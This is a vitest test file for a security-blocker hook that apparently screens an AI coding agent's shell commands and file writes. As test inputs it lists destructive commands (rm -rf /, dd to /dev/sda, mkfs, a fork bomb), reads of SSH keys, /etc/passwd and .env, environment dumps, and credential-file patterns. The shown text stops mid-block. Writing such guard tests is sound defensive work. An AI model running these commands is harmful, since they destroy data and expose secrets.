/**
 * Tests for security-blocker hook
 *
 * SECURITY-CRITICAL TESTS
 *
 * These tests verify that the security blocker correctly:
 * - Blocks ALL dangerous command patterns (rm -rf /, dd, mkfs, fork bombs)
 * - Blocks ALL sensitive file patterns in bash commands (.env, /etc/, .ssh/)
 * - Detects path traversal attempts (..)
 * - Blocks environment file modifications (.env, .env.local, .envrc)
 * - Blocks git internals modifications (.git/, .gitconfig)
 * - Blocks SSH key modifications (id_rsa, id_ed25519, .pem)
 * - Blocks credential file modifications (.aws/credentials, .npmrc)
 * - Blocks system directory modifications (/etc, /usr, /var, /sys, /proc, /boot, /root)
 * - Blocks macOS system paths (/private/etc, /private/var)
 * - CRITICAL: Detects symlink bypass attacks (ME-001)
 * - Allows safe operations
 *
 * @module tests/pretool/security-blocker
 */

import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  BASH_SENSITIVE_PATTERNS,
  CREDENTIAL_PATTERNS,
  DANGEROUS_COMMAND_PATTERNS,
  ENV_DUMP_PATTERNS,
  ENV_PATTERNS,
  GIT_PATTERNS,
  GIT_PUSH_REGEX,
  HOOK_NAME,
  SSH_PATTERNS,
  SYSTEM_DIR_PATTERNS,
  matchesDangerousCommand,
  matchesEnvDumpCommand,
  matchesGitPush,
  matchesProtectedPath,
  normalizeBashEscapes,
  normalizeHomeRefs,
  securityBlocker,
} from '../../src/pretool/security-blocker.js';
import type { HookInput, ToolName } from '../../src/types.js';

// =============================================================================
// TEST HELPERS
// =============================================================================

/**
 * Create a mock HookInput for Bash tool
 */
function createBashInput(command: string, sessionId?: string): HookInput {
  return {
    tool_name: 'Bash',
    tool_input: { command },
    ...(sessionId && { session_id: sessionId }),
  };
}

/**
 * Create a mock HookInput for file operation tools
 */
function createFileInput(
  toolName: 'Write' | 'Edit' | 'MultiEdit',
  filePath: string,
  sessionId?: string
): HookInput {
  return {
    tool_name: toolName,
    tool_input: { file_path: filePath },
    ...(sessionId && { session_id: sessionId }),
  };
}

/**
 * Create a mock HookInput for any tool
 */
function createToolInput(toolName: ToolName, sessionId?: string): HookInput {
  return {
    tool_name: toolName,
    tool_input: {},
    ...(sessionId && { session_id: sessionId }),
  };
}

/**
 * Create a temporary directory for symlink tests
 */
function createTempDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'security-blocker-test-'));
}

/**
 * Clean up a temporary directory
 */
function cleanupTempDir(dir: string): void {
  fs.rmSync(dir, { recursive: true, force: true });
}

// =============================================================================
// PATTERN EXPORT TESTS
// =============================================================================

describe('pattern exports', () => {
  it('should export ENV_PATTERNS array', () => {
    expect(Array.isArray(ENV_PATTERNS)).toBe(true);
    expect(ENV_PATTERNS.length).toBeGreaterThan(0);
    expect(ENV_PATTERNS[0]).toBeInstanceOf(RegExp);
  });

  it('should export GIT_PATTERNS array', () => {
    expect(Array.isArray(GIT_PATTERNS)).toBe(true);
    expect(GIT_PATTERNS.length).toBeGreaterThan(0);
  });

  it('should export SSH_PATTERNS array', () => {
    expect(Array.isArray(SSH_PATTERNS)).toBe(true);
    expect(SSH_PATTERNS.length).toBeGreaterThan(0);
  });

  it('should export CREDENTIAL_PATTERNS array', () => {
    expect(Array.isArray(CREDENTIAL_PATTERNS)).toBe(true);
    expect(CREDENTIAL_PATTERNS.length).toBeGreaterThan(0);
  });

  it('should export SYSTEM_DIR_PATTERNS array', () => {
    expect(Array.isArray(SYSTEM_DIR_PATTERNS)).toBe(true);
    expect(SYSTEM_DIR_PATTERNS.length).toBeGreaterThan(0);
  });

  it('should export DANGEROUS_COMMAND_PATTERNS array', () => {
    expect(Array.isArray(DANGEROUS_COMMAND_PATTERNS)).toBe(true);
    expect(DANGEROUS_COMMAND_PATTERNS.length).toBeGreaterThan(0);
  });

  it('should export ENV_DUMP_PATTERNS array', () => {
    expect(Array.isArray(ENV_DUMP_PATTERNS)).toBe(true);
    expect(ENV_DUMP_PATTERNS.length).toBeGreaterThan(0);
    expect(ENV_DUMP_PATTERNS[0]).toBeInstanceOf(RegExp);
  });

  it('should export BASH_SENSITIVE_PATTERNS array', () => {
    expect(Array.isArray(BASH_SENSITIVE_PATTERNS)).toBe(true);
    expect(BASH_SENSITIVE_PATTERNS.length).toBeGreaterThan(0);
  });

  it('should export HOOK_NAME constant', () => {
    expect(typeof HOOK_NAME).toBe('string');
    expect(HOOK_NAME).toBe('pre-tool-use-security');
  });
});

// =============================================================================
// matchesDangerousCommand TESTS
// =============================================================================

describe('matchesDangerousCommand', () => {
  describe('rm -rf / variants', () => {
    it('should detect rm -rf /', () => {
      expect(matchesDangerousCommand('rm -rf /').matched).toBe(true);
    });

    it('should detect rm -rf with spaces', () => {
      expect(matchesDangerousCommand('rm  -rf  /').matched).toBe(true);
    });

    it('should detect rm -rf / at end of command', () => {
      expect(matchesDangerousCommand('sudo rm -rf /').matched).toBe(true);
    });

    it('should detect rm -fr / (reversed flags)', () => {
      expect(matchesDangerousCommand('rm -fr /').matched).toBe(true);
    });

    it('should detect rm --recursive --force /', () => {
      expect(matchesDangerousCommand('rm --recursive --force /home').matched).toBe(true);
    });

    it('should detect rm --force --recursive /', () => {
      expect(matchesDangerousCommand('rm --force --recursive /etc').matched).toBe(true);
    });

    it('should detect rm -rf with flag combinations where r comes before f', () => {
      // -rvf has r followed by any chars then f - matches r[a-zA-Z]*f pattern
      expect(matchesDangerousCommand('rm -rvf /').matched).toBe(true);
      // Note: -rfv doesn't match because f is not at the end of the flags
      // The pattern looks for r...f (r followed by f), not flags containing both
      expect(matchesDangerousCommand('rm -rfv /').matched).toBe(false);
    });
  });

  describe('rm -rf ~ variants', () => {
    it('should detect rm -rf ~', () => {
      expect(matchesDangerousCommand('rm -rf ~').matched).toBe(true);
    });

    it('should detect rm -fr ~', () => {
      expect(matchesDangerousCommand('rm -fr ~').matched).toBe(true);
    });

    it('should detect rm -rf ~/path', () => {
      expect(matchesDangerousCommand('rm -rf ~/').matched).toBe(true);
    });
  });

  describe('dd to device', () => {
    it('should detect dd of=/dev/sda', () => {
      expect(matchesDangerousCommand('dd if=/dev/zero of=/dev/sda').matched).toBe(true);
    });

    it('should detect dd of=/dev/null', () => {
      expect(matchesDangerousCommand('dd if=file of=/dev/null').matched).toBe(true);
    });

    it('should detect dd with different options order', () => {
      expect(matchesDangerousCommand('dd bs=1M of=/dev/sdb if=/dev/zero').matched).toBe(true);
    });

    it('should allow dd without device output', () => {
      expect(matchesDangerousCommand('dd if=input.iso of=output.iso').matched).toBe(false);
    });
  });

  describe('mkfs commands', () => {
    it('should detect mkfs.ext4', () => {
      expect(matchesDangerousCommand('mkfs.ext4 /dev/sda1').matched).toBe(true);
    });

    it('should detect mkfs.ntfs', () => {
      expect(matchesDangerousCommand('mkfs.ntfs /dev/sdb1').matched).toBe(true);
    });

    it('should detect mkfs.vfat', () => {
      expect(matchesDangerousCommand('mkfs.vfat /dev/sdc1').matched).toBe(true);
    });

    it('should detect mkfs.xfs', () => {
      expect(matchesDangerousCommand('mkfs.xfs /dev/sda2').matched).toBe(true);
    });
  });

  describe('format commands', () => {
    it('should detect format /dev/', () => {
      expect(matchesDangerousCommand('format /dev/sda').matched).toBe(true);
    });
  });

  describe('fork bomb', () => {
    it('should detect fork bomb pattern', () => {
      expect(matchesDangerousCommand(':(){:|:&};:').matched).toBe(true);
    });

    it('should detect fork bomb without newlines (common variant)', () => {
      // The basic fork bomb pattern without spaces around braces
      expect(matchesDangerousCommand(':(){:}; :(){:|:&};:').matched).toBe(true);
    });
  });

  describe('mv to /dev/null', () => {
    it('should detect mv to /dev/null', () => {
      expect(matchesDangerousCommand('mv important.txt /dev/null').matched).toBe(true);
    });

    it('should detect mv * to /dev/null', () => {
      expect(matchesDangerousCommand('mv * /dev/null').matched).toBe(true);
    });
  });

  describe('dangerous chmod/chown', () => {
    it('should detect chmod -R 777 /', () => {
      expect(matchesDangerousCommand('chmod -R 777 /').matched).toBe(true);
    });

    it('should detect chmod -R 777 /etc', () => {
      expect(matchesDangerousCommand('chmod -R 777 /etc').matched).toBe(true);
    });

    it('should detect chown -R root /', () => {
      expect(matchesDangerousCommand('chown -R root /').matched).toBe(true);
    });

    it('should detect chown -R root /home', () => {
      expect(matchesDangerousCommand('chown -R root /home').matched).toBe(true);
    });

    it('should allow chmod on specific file', () => {
      expect(matchesDangerousCommand('chmod 755 script.sh').matched).toBe(false);
    });
  });

  describe('redirect to /dev/sda', () => {
    it('should detect > /dev/sda', () => {
      expect(matchesDangerousCommand('cat file > /dev/sda').matched).toBe(true);
    });

    it('should detect > /dev/sda without space', () => {
      expect(matchesDangerousCommand('echo test >/dev/sda').matched).toBe(true);
    });
  });

  describe('safe commands', () => {
    it('should allow rm on specific file', () => {
      expect(matchesDangerousCommand('rm file.txt').matched).toBe(false);
    });

    it('should allow rm -r on directory', () => {
      expect(matchesDangerousCommand('rm -r ./temp').matched).toBe(false);
    });

    it('should allow rm -rf on relative path', () => {
      expect(matchesDangerousCommand('rm -rf ./node_modules').matched).toBe(false);
    });

    it('should allow safe dd usage', () => {
      expect(matchesDangerousCommand('dd if=input.bin of=output.bin').matched).toBe(false);
    });

    it('should allow safe chmod', () => {
      expect(matchesDangerousCommand('chmod 644 README.md').matched).toBe(false);
    });
  });
});

// =============================================================================
// matchesEnvDumpCommand TESTS
// =============================================================================

describe('matchesEnvDumpCommand', () => {
  describe('printenv', () => {
    it('should detect printenv alone', () => {
      expect(matchesEnvDumpCommand('printenv').matched).toBe(true);
    });

    it('should detect printenv with arg', () => {
      expect(matchesEnvDumpCommand('printenv HOME').matched).toBe(true);
    });

    it('should detect printenv piped', () => {
      expect(matchesEnvDumpCommand('printenv | grep KEY').matched).toBe(true);
    });

    it('should detect printenv after pipe', () => {
      expect(matchesEnvDumpCommand('echo test | printenv').matched).toBe(true);
    });
  });

  describe('env', () => {
    it('should detect env alone', () => {
      expect(matchesEnvDumpCommand('env').matched).toBe(true);
    });

    it('should detect env piped', () => {
      expect(matchesEnvDumpCommand('env | sort').matched).toBe(true);
    });

    it('should detect env after &&', () => {
      expect(matchesEnvDumpCommand('cd /tmp && env').matched).toBe(true);
    });

    it('should detect env after semicolon', () => {
      expect(matchesEnvDumpCommand('echo hello; env').matched).toBe(true);
    });

    it('should NOT match env VAR=val cmd (env used to set vars)', () => {
      expect(matchesEnvDumpCommand('env VAR=val command').matched).toBe(false);
    });

    it('should NOT match env -i bash', () => {
      expect(matchesEnvDumpCommand('env -i bash').matched).toBe(false);
    });

    it('should NOT match /usr/bin/env python', () => {
      expect(matchesEnvDumpCommand('/usr/bin/env python').matched).toBe(false);
    });
  });

  describe('set', () => {
    it('should detect set alone', () => {
      expect(matchesEnvDumpCommand('set').matched).toBe(true);
    });

    it('should detect set piped', () => {
      expect(matchesEnvDumpCommand('set | grep PATH').matched).toBe(true);
    });

    it('should NOT match set -e', () => {
      expect(matchesEnvDumpCommand('set -e').matched).toBe(false);
    });

    it('should NOT match set -x', () => {
      expect(matchesEnvDumpCommand('set -x').matched).toBe(false);
    });

    it('should NOT match set -o pipefail', () => {
      expect(matchesEnvDumpCommand('set -o pipefail').matched).toBe(false);
    });
  });

  describe('export -p', () => {
    it('should detect export -p', () => {
      expect(matchesEnvDumpCommand('export -p').matched).toBe(true);
    });

    it('should detect export -p piped', () => {
      expect(matchesEnvDumpCommand('export -p | grep AWS').matched).toBe(true);
    });

    it('should NOT match export VAR=val', () => {
      expect(matchesEnvDumpCommand('export VAR=val').matched).toBe(false);
    });
  });

  describe('declare -x', () => {
    it('should detect declare -x', () => {
      expect(matchesEnvDumpCommand('declare -x').matched).toBe(true);
    });

    it('should detect declare -x piped', () => {
      expect(matchesEnvDumpCommand('declare -x | head').matched).toBe(true);
    });

    it('should NOT match declare -i count=5', () => {
      expect(matchesEnvDumpCommand('declare -i count=5').matched).toBe(false);
    });
  });

  describe('compgen -v', () => {
    it('should detect compgen -v', () => {
      expect(matchesEnvDumpCommand('compgen -v').matched).toBe(true);
    });

    it('should NOT match compgen -c', () => {
      expect(matchesEnvDumpCommand('compgen -c').matched).toBe(false);
    });
  });
});

// =============================================================================
// matchesProtectedPath TESTS
// =============================================================================

describe('matchesProtectedPath', () => {
  describe('environment file patterns', () => {
    it('should match .env', () => {
      const result = matchesProtectedPath('.env');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('env');
    });

    it('should match .env.local', () => {
      const result = matchesProtectedPath('.env.local');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('env');
    });

    it('should match .env.production', () => {
      const result = matchesProtectedPath('.env.production');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('env');
    });

    it('should match .env.development', () => {
      const result = matchesProtectedPath('.env.development');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('env');
    });

    it('should match .envrc', () => {
      const result = matchesProtectedPath('.envrc');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('env');
    });

    it('should match .env_backup', () => {
      const result = matchesProtectedPath('.env_backup');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('env');
    });

    it('should match .env-backup', () => {
      const result = matchesProtectedPath('.env-backup');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('env');
    });

    it('should match nested .env files', () => {
      const result = matchesProtectedPath('config/.env');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('env');
    });
  });

  describe('git patterns', () => {
    it('should match .git/', () => {
      const result = matchesProtectedPath('.git/config');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('git');
    });

    it('should match .git (directory itself)', () => {
      const result = matchesProtectedPath('.git');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('git');
    });

    it('should match .gitconfig', () => {
      const result = matchesProtectedPath('.gitconfig');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('git');
    });

    it('should match nested .gitconfig', () => {
      const result = matchesProtectedPath('/home/user/.gitconfig');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('git');
    });

    it('should match .git/hooks/', () => {
      const result = matchesProtectedPath('.git/hooks/pre-commit');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('git');
    });

    it('should NOT match .gitignore', () => {
      const result = matchesProtectedPath('.gitignore');
      expect(result.matched).toBe(false);
    });

    it('should NOT match .gitattributes', () => {
      const result = matchesProtectedPath('.gitattributes');
      expect(result.matched).toBe(false);
    });
  });

  describe('SSH patterns', () => {
    it('should match .ssh/id_rsa', () => {
      const result = matchesProtectedPath('.ssh/id_rsa');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match .ssh/id_ed25519', () => {
      const result = matchesProtectedPath('.ssh/id_ed25519');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match .ssh/id_ecdsa', () => {
      const result = matchesProtectedPath('.ssh/id_ecdsa');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match .ssh/id_dsa', () => {
      const result = matchesProtectedPath('.ssh/id_dsa');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match .ssh/id_rsa.pub', () => {
      // This matches id_ pattern
      const result = matchesProtectedPath('.ssh/id_rsa.pub');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match .ssh/server.pem', () => {
      const result = matchesProtectedPath('.ssh/server.pem');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match .ssh/key_rsa', () => {
      const result = matchesProtectedPath('.ssh/key_rsa');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match .ssh/key_dsa', () => {
      const result = matchesProtectedPath('.ssh/key_dsa');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match .ssh/key_ed25519', () => {
      const result = matchesProtectedPath('.ssh/key_ed25519');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match .ssh/key_ecdsa', () => {
      const result = matchesProtectedPath('.ssh/key_ecdsa');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match .ssh/known_hosts', () => {
      const result = matchesProtectedPath('.ssh/known_hosts');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match .ssh/authorized_keys', () => {
      const result = matchesProtectedPath('.ssh/authorized_keys');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });

    it('should match nested SSH paths', () => {
      const result = matchesProtectedPath('/home/user/.ssh/id_rsa');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('ssh');
    });
  });

  describe('credential patterns', () => {
    it('should match .aws/credentials', () => {
      const result = matchesProtectedPath('.aws/credentials');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('credential');
    });

    it('should match .npmrc', () => {
      const result = matchesProtectedPath('.npmrc');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('credential');
    });

    it('should match .pypirc', () => {
      const result = matchesProtectedPath('.pypirc');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('credential');
    });

    it('should match secrets.yml', () => {
      const result = matchesProtectedPath('secrets.yml');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('credential');
    });

    it('should match secrets.yaml', () => {
      const result = matchesProtectedPath('secrets.yaml');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('credential');
    });

    it('should match credentials.json', () => {
      const result = matchesProtectedPath('credentials.json');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('credential');
    });

    it('should match .netrc', () => {
      const result = matchesProtectedPath('.netrc');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('credential');
    });

    it('should match .pgpass', () => {
      const result = matchesProtectedPath('.pgpass');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('credential');
    });

    it('should match .kube/config', () => {
      const result = matchesProtectedPath('.kube/config');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('credential');
    });

    it('should match .docker/config.json', () => {
      const result = matchesProtectedPath('.docker/config.json');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('credential');
    });

    it('should match nested credential files', () => {
      const result = matchesProtectedPath('/home/user/.aws/credentials');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('credential');
    });
  });

  describe('system directory patterns', () => {
    it('should match /etc/', () => {
      const result = matchesProtectedPath('/etc/passwd');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('system');
    });

    it('should match /usr/', () => {
      const result = matchesProtectedPath('/usr/bin/node');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('system');
    });

    it('should match /var/', () => {
      const result = matchesProtectedPath('/var/log/syslog');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('system');
    });

    it('should match /sys/', () => {
      const result = matchesProtectedPath('/sys/class/net');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('system');
    });

    it('should match /proc/', () => {
      const result = matchesProtectedPath('/proc/cpuinfo');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('system');
    });

    it('should match /boot/', () => {
      const result = matchesProtectedPath('/boot/grub/grub.cfg');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('system');
    });

    it('should match /root/', () => {
      const result = matchesProtectedPath('/root/.bashrc');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('system');
    });

    it('should match /private/etc/ (macOS)', () => {
      const result = matchesProtectedPath('/private/etc/hosts');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('system');
    });

    it('should match /private/var/ (macOS)', () => {
      const result = matchesProtectedPath('/private/var/log/system.log');
      expect(result.matched).toBe(true);
      expect(result.category).toBe('system');
    });
  });

  describe('safe paths', () => {
    it('should NOT match regular source files', () => {
      expect(matchesProtectedPath('src/index.ts').matched).toBe(false);
    });

    it('should NOT match package.json', () => {
      expect(matchesProtectedPath('package.json').matched).toBe(false);
    });

    it('should NOT match tsconfig.json', () => {
      expect(matchesProtectedPath('tsconfig.json').matched).toBe(false);
    });

    it('should NOT match README.md', () => {
      expect(matchesProtectedPath('README.md').matched).toBe(false);
    });

    it('should NOT match .gitignore', () => {
      expect(matchesProtectedPath('.gitignore').matched).toBe(false);
    });

    it('should NOT match .eslintrc.json', () => {
      expect(matchesProtectedPath('.eslintrc.json').matched).toBe(false);
    });

    it('should NOT match node_modules paths', () => {
      expect(matchesProtectedPath('node_modules/lodash/index.js').matched).toBe(false);
    });
  });
});

// =============================================================================
// securityBlocker MAIN HOOK TESTS - BASH COMMANDS
// =============================================================================

describe('securityBlocker - Bash commands', () => {
  describe('dangerous commands', () => {
    it('should block rm -rf /', async () => {
      const result = await securityBlocker(createBashInput('rm -rf /'));

      expect(result.continue).toBe(false);
      expect(result.stopReason).toContain('BLOCKED');
      expect(result.stopReason).toContain('Dangerous command');
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block rm -rf ~', async () => {
      const result = await securityBlocker(createBashInput('rm -rf ~'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    // CC v2.1.162 alignment: $HOME spellings must hit the same deny patterns
    // as ~ (previously they fell through to a mere approval prompt).
    it('should block rm -rf $HOME', async () => {
      const result = await securityBlocker(createBashInput('rm -rf $HOME'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block rm -rf ${HOME}', async () => {
      const result = await securityBlocker(createBashInput('rm -rf ${HOME}'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block split-flag rm -r -f $HOME', async () => {
      const result = await securityBlocker(createBashInput('rm -r -f $HOME'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block chmod -R 777 $HOME', async () => {
      const result = await securityBlocker(createBashInput('chmod -R 777 $HOME'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block wrapped sh -c with $HOME target', async () => {
      const result = await securityBlocker(createBashInput("sh -c 'rm -rf $HOME'"));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    // Review !209 findings #1 + #5: separator-glued, quoted, and wrapper-brace forms
    it('should block separator-glued rm -rf $HOME;ls', async () => {
      const result = await securityBlocker(createBashInput('rm -rf $HOME;ls'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block quoted rm -rf "$HOME"', async () => {
      const result = await securityBlocker(createBashInput('rm -rf "$HOME"'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block wrapped sh -c with brace form ${HOME}', async () => {
      const result = await securityBlocker(createBashInput("sh -c 'rm -rf ${HOME}'"));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block sudo rm -rf /', async () => {
      const result = await securityBlocker(createBashInput('sudo rm -rf /'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block dd of=/dev/sda', async () => {
      const result = await securityBlocker(createBashInput('dd if=/dev/zero of=/dev/sda'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block mkfs.ext4', async () => {
      const result = await securityBlocker(createBashInput('mkfs.ext4 /dev/sda1'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block fork bomb', async () => {
      const result = await securityBlocker(createBashInput(':(){:|:&};:'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block chmod -R 777 /', async () => {
      const result = await securityBlocker(createBashInput('chmod -R 777 /'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });
  });

  describe('sensitive file references', () => {
    it('should block commands referencing .env', async () => {
      const result = await securityBlocker(createBashInput('cat .env'));

      expect(result.continue).toBe(false);
      expect(result.stopReason).toContain('BLOCKED');
      expect(result.stopReason).toContain('protected resource');
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block commands referencing /etc/', async () => {
      const result = await securityBlocker(createBashInput('cat /etc/passwd'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block commands referencing .ssh/id_', async () => {
      const result = await securityBlocker(createBashInput('cat ~/.ssh/id_rsa'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block commands referencing /root/', async () => {
      const result = await securityBlocker(createBashInput('ls /root/.bashrc'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });
  });

  describe('environment dump commands', () => {
    it('should block printenv', async () => {
      const result = await securityBlocker(createBashInput('printenv'));

      expect(result.continue).toBe(false);
      expect(result.stopReason).toContain('BLOCKED');
      expect(result.stopReason).toContain('Environment dump');
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block env (standalone)', async () => {
      const result = await securityBlocker(createBashInput('env'));

      expect(result.continue).toBe(false);
      expect(result.stopReason).toContain('Environment dump');
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block set (standalone)', async () => {
      const result = await securityBlocker(createBashInput('set'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block export -p', async () => {
      const result = await securityBlocker(createBashInput('export -p'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block env piped to sort', async () => {
      const result = await securityBlocker(createBashInput('env | sort'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should allow set -e (shell option)', async () => {
      const result = await securityBlocker(createBashInput('set -e'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should allow env VAR=val cmd', async () => {
      const result = await securityBlocker(createBashInput('env NODE_ENV=test node app.js'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should suggest echo $VARIABLE_NAME in deny message', async () => {
      const result = await securityBlocker(createBashInput('printenv'));

      expect(result.stopReason).toContain('echo $VARIABLE_NAME');
    });

    it('should block /usr/bin/env python (sensitive /usr/ path)', async () => {
      // /usr/bin/env python is blocked by BASH_SENSITIVE_PATTERNS (contains /usr/)
      // not by ENV_DUMP_PATTERNS — the env dump pattern doesn't match /usr/bin/env
      const result = await securityBlocker(createBashInput('/usr/bin/env python'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should allow export VAR=val', async () => {
      const result = await securityBlocker(createBashInput('export MY_VAR=hello'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });
  });

  describe('safe commands', () => {
    it('should allow ls', async () => {
      const result = await securityBlocker(createBashInput('ls -la'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should allow git status', async () => {
      const result = await securityBlocker(createBashInput('git status'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should allow npm test', async () => {
      const result = await securityBlocker(createBashInput('npm test'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should allow rm on specific file', async () => {
      const result = await securityBlocker(createBashInput('rm temp.txt'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should allow rm -rf on relative path', async () => {
      const result = await securityBlocker(createBashInput('rm -rf ./node_modules'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });
  });

  describe('edge cases', () => {
    it('should handle empty command', async () => {
      const result = await securityBlocker(createBashInput(''));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should handle missing command', async () => {
      const input: HookInput = {
        tool_name: 'Bash',
        tool_input: {},
      };
      const result = await securityBlocker(input);

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });
  });
});

// =============================================================================
// securityBlocker MAIN HOOK TESTS - FILE OPERATIONS
// =============================================================================

describe('securityBlocker - File operations', () => {
  describe('environment files', () => {
    it('should block Write to .env', async () => {
      const result = await securityBlocker(createFileInput('Write', '.env'));

      expect(result.continue).toBe(false);
      expect(result.stopReason).toContain('BLOCKED');
      expect(result.stopReason).toContain('Environment file');
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Edit to .env.local', async () => {
      const result = await securityBlocker(createFileInput('Edit', '.env.local'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block MultiEdit to .envrc', async () => {
      const result = await securityBlocker(createFileInput('MultiEdit', '.envrc'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to nested .env file', async () => {
      const result = await securityBlocker(createFileInput('Write', 'config/.env'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });
  });

  describe('git patterns', () => {
    it('should block Write to .git/config', async () => {
      const result = await securityBlocker(createFileInput('Write', '.git/config'));

      expect(result.continue).toBe(false);
      expect(result.stopReason).toContain('Git configuration');
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Edit to .gitconfig', async () => {
      const result = await securityBlocker(createFileInput('Edit', '.gitconfig'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

